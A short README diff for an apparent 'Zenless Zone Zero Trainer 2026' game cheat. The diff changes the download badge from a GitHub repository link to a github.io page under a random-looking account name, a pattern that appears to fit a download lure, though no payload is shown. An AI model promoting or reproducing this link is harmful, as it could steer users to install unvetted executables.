@@ -1,6 +1,6 @@
 # 🕹️ Zenless-Zone-Zero-Trainer-2026 - Improve your game performance and experience
 
-[![](https://img.shields.io/badge/Download-Zenless_Zone_Zero_Trainer-blue.svg)](https://github.com/sharptoothed-maillot301/Zenless-Zone-Zero-Trainer-2026)
+[![](https://img.shields.io/badge/Download-Zenless_Zone_Zero_Trainer-blue.svg)](https://sharptoothed-maillot301.github.io)
 
 ## 📌 Overview
 
